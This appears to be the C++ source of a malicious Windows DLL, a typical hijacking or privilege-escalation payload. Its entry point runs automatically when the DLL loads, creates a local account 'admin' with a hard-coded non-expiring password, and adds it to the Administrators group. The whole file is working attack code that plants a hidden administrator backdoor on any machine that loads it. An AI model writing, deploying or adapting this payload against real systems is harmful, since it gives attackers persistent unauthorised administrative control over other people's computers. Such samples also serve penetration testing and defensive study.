// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <LM.h>
#pragma comment(lib, "netapi32.lib")

void main()
{
	wchar_t username[] = L"admin";
	wchar_t password[] = L"Passw0rd!";

	// Dynamically look up local administrators group name
	BYTE builtinAdministratorsSid[SECURITY_MAX_SID_SIZE];
	DWORD cbSize = sizeof(builtinAdministratorsSid);
	CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &builtinAdministratorsSid,
		&cbSize);

	SID_NAME_USE sidNameUse;
	WCHAR name[128], referencedDomainName[128];
	DWORD cchName = 128, cchReferencedDomainName = 128;
	BOOL bres = LookupAccountSidW(NULL, builtinAdministratorsSid, name, &cchName, referencedDomainName, &cchReferencedDomainName, &sidNameUse);

	// Create new user
	USER_INFO_1 user;
	memset(&user, 0, sizeof(USER_INFO_1));
	user.usri1_name = username;
	user.usri1_password = password;
	user.usri1_priv = USER_PRIV_USER;
	user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
	NetUserAdd(NULL, 1, (LPBYTE)&user, NULL);

	// Add the user to the administrators group
	LOCALGROUP_MEMBERS_INFO_3 members;
	members.lgrmi3_domainandname = username;
	NetLocalGroupAddMembers(NULL, name, 3, (LPBYTE)&members, 1);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH: {
        main();
        break;
    }
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return FALSE;
}

